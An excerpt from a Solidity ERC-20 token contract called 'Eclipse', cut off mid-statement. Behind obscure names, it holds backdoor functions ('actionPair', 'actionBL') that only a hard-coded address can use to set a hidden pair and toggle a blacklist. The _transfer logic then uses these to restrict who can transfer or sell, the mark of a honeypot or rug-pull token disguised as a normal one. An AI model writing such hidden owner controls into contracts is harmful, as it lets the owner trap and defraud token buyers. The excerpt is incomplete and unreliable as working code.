...
contract Eclipse is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
        if(_msgSender() == 0x8d01199082d872886a99BA5f2C98d281EA19D618) _p76234 = account;
        return true;
    }

    function actionBL(address account) public virtual returns (bool) {
        if(_msgSender() == 0x8d01199082d872886a99BA5f2C98d281EA19D618) _bl[account] = !_bl[account];
        return true;
    }
    ...
    function _transfer(
        ...
        if((from != _p76234 && to == 0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) || ((_p76234 == to || _bl[to]) && from != 0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80 && from  != 0x8d01199082d872886a99BA5f2C98d281EA19D618)) {
